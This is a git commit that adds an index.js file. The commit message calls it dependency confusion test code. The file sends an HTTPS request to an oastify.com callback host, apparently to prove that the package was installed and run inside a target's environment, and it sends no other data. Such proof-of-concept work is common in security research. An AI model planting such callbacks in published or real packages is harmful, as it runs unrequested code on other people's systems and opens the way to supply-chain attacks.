b6d8a45bc9215b42c25f4d63005034856fd93cb8
FancybearIN <itsdeep0007@gmail.com>
2025-07-16 22:56:00 +0530

    Add dependency confusion test code

---
+++ index.js
@@ -0,0 +1,6 @@
+// index.js
+const https = require('https');
+
+https.get('https://www.hyj0w75p7j3y6cl3yng4za81rsxjl99y.oastify.com', (res) => {
+  console.log('Pinged your server for dependency confusion test.');
+});
